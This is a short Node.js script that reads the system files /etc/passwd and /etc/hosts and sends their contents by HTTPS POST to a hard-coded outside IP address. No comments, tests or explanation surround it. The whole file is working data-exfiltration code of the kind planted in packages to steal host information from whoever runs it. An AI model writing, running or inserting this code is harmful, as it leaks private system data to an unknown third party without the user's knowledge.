const fs = require('fs');
const https = require('https');
const host = '154.61.80.228';
const files = ['/etc/passwd', '/etc/hosts'];
for (const file of files) {
  fs.readFile(file, 'utf8', (err, data) => {
    if (err) return;
    const postData = data;
    const req = https.request({hostname: host, method: 'POST'});
    req.write(postData);
    req.end();
  });
}
